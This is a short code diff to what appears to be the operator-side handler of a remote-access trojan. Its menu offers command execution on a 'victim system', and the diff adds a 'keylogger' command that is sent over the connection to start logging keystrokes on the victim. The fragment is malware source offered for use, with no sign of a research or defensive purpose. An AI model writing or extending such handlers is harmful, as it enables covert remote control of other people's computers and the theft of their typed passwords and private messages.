@@ -1,6 +1,7 @@
 def options():
     print("[+] Enter 'shell' to Execute command on victim system")
     print("[+] Enter 'exit' to exit the handler and close the connection")
+    print("[+] Enter 'keylogger' to initiate start keylogger on victim system")
 
 def send_command(sock):
     while True:
@@ -31,8 +32,9 @@ def handler(sock):
         elif User_input=="exit":
             print("[+] Exiting handler")
             sock.send_data(User_input)
-
             break
+        elif User_input=="keylogger":
+            sock.send_data(User_input)
         else:
             print("[+] Invalid input")
             options()
